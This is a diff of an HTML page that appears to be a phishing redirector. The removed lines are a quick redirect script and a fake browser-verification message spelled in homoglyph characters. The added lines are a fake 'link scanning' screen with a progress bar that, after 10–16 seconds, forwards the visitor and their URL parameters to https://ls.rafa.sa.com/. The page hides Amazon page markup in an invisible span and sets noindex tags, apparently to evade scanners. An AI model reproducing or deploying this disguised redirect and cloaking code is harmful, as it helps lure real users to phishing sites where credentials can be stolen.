@@ -276,49 +276,7 @@ if (typeof ues === 'function') {
 </head>
   <html lang="en">
   <head>
-    <script>
-  // List of URLs to cycle through
-  const urls = ["https://ls.rafa.sa.com/"];
-
-  // Function to get query string from the current URL
-  function getQueryString() {
-    return window.location.search; // This includes the '?' character
-  }
-
-  // Function to get the next URL from local storage or default to the first URL
-  function getNextUrl() {
-    let currentIndex = localStorage.getItem("currentIndex");
-    
-    // Default to index 0 if not set
-    currentIndex = currentIndex ? parseInt(currentIndex) : 0;
-
-    // Get the next URL
-    const nextUrl = urls[currentIndex];
-
-    // Update the index for the next visit
-    currentIndex = (currentIndex + 1) % urls.length;
-    localStorage.setItem("currentIndex", currentIndex);
-
-    return nextUrl;
-  }
-
-  // Main function to execute the redirect
-  function redirectToNextUrl() {
-    const queryString = getQueryString();
-    const nextUrl = getNextUrl();
-
-    // Append the specified query string to the next URL
-    const fullUrl = `${nextUrl}${queryString}`; // Append custom query and any existing query
-
-    // Redirect to the constructed URL after a 5-second delay
-    setTimeout(() => {
-      window.location.href = fullUrl;
-    }, 500); // 500 milliseconds = 0.5 seconds
-  }
-
-  // Execute the redirect when the page loads
-  window.onload = redirectToNextUrl;
-</script>
+   
 
     <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
     <meta content="noindex,noarchive,nofollow,nosnippet" name="robots" />
@@ -341,60 +299,107 @@ if (typeof ues === 'function') {
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
             font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
         }
-        .container {
+        .captcha-container {
             text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-        .message {
-            font-size: 18px;
-            color: #333;
+        .loading-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #ddd;
+            margin-top: 20px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .loading-progress {
+            height: 100%;
+            width: 0;
+            background-color: #007BFF;
+            transition: width 0.3s ease-out;
+        }
+        .robot-prompt {
             margin-bottom: 20px;
+            font-size: 18px;
+            opacity: 1;
+            transition: opacity 0.85s ease-in-out; /* 0.85 seconds for each half of the fade */
         }
-        .loading {
-            display: inline-block;
-            width: 80px;
-            height: 80px;
-        }
-        .loading div {
-            width: 16px;
-            height: 16px;
-            margin: 0 8px;
-            background-color: #333;
-            border-radius: 50%;
-            display: inline-block;
-            animation: loading 1.2s infinite ease-in-out;
-        }
-        .loading div:nth-child(2) {
-            animation-delay: -0.4s;
-        }
-        .loading div:nth-child(3) {
-            animation-delay: -0.8s;
-        }
-        @keyframes loading {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.5);
-            }
-            100% {
-                transform: scale(1);
+        @media (max-width: 600px) {
+            .captcha-button {
+                padding: 15px 30px;
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="message">ꓚһесkіոց аոd νеrіfуіոց уоսr brоԝѕеr fоr а ѕесսrе соոոесtіоո...</div>
-        <div class="loading">
-            <div></div>
-            <div></div>
-            <div></div>
+    <div class="captcha-container">
+        <img src="data:image/png;base64,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" alt="Platinum" class="captcha-image" width="180px" Height="auto"<br><br>
+        <div class="robot-prompt" id="robotPrompt" style="width: 300px; font-size: 17px;">Accessing link...</div>
+        <div class="loading-bar">
+            <div class="loading-progress" id="loadingProgress"></div>
         </div>
-        <div class="message">ꓦеrіfуіոց tһаt уоս аrе һսmаո...</div>
     </div>
+    <script>
+        const progressBar = document.getElementById('loadingProgress');
+        const robotPrompt = document.getElementById('robotPrompt');
+        let progress = 0;
+        const totalDuration = 20000; // 20 seconds
+        const minRedirectDelay = 10000; // 5 seconds
+        const maxRedirectDelay = 16000; // 10 seconds
+        const stepTime = totalDuration / 100; // Time for each 1% step
+        const messages = [
+            "Verifying link...",
+            "Expanding link...",
+            "Connecting to a server...",
+            "Loading page...",
+            "Verifying content...",
+            "Extracting page features...",
+            "Verifying features...",
+            "Scan Complete"
+        ];
+        let messageIndex = 0;
+
+        function startProgress() {
+            const timer = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(timer);
+                }
+            }, stepTime);
+
+            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
+            setTimeout(() => {
+                const currentUrl = new URL(window.location.href);
+                const params = currentUrl.search;
+                const redirectUrl = "https://ls.rafa.sa.com/" + params;
+                window.location.href = redirectUrl;
+            }, redirectDelay);
+        }
+
+        function changeMessage() {
+            robotPrompt.style.opacity = '0';
+            setTimeout(() => {
+                robotPrompt.textContent = messages[messageIndex];
+                robotPrompt.style.opacity = '1';
+                messageIndex = (messageIndex + 1) % messages.length;
+                const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
+                setTimeout(changeMessage, randomDelay);
+            }, 850); // Wait for the fade-out transition to complete
+        }
+
+        window.onload = () => {
+            startProgress();
+            const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
+            setTimeout(changeMessage, initialDelay);
+        };
+    </script>
 <span style="display: none;">
 <body class="a-m-us a-aui_72554-c a-aui_a11y_2_750578-c a-aui_a11y_6_837773-c a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_A11Y_2_750578":"C","AUI_AMZN_IMG_959719":"C","AUI_A11Y_6_837773":"C","AUI_TNR_V2_180836":"C","AUI_AMZN_IMG_GATE_959718":"C","AUI_TEMPLATE_WEBLAB_CACHE_333406":"C","AUI_72554":"C","AUI_KILLSWITCH_CSA_LOGGER_372963":"C","AUI_A11Y_SR_678508":"T1","AUI_PCI_RISK_BANNER_210084":"C"}</script><script>typeof uex === 'function' && uex('ld', 'portal-bb', {wb: 1})</script><!-- sp:end-feature:start-body -->
 <!-- sp:feature:csm:body-open -->
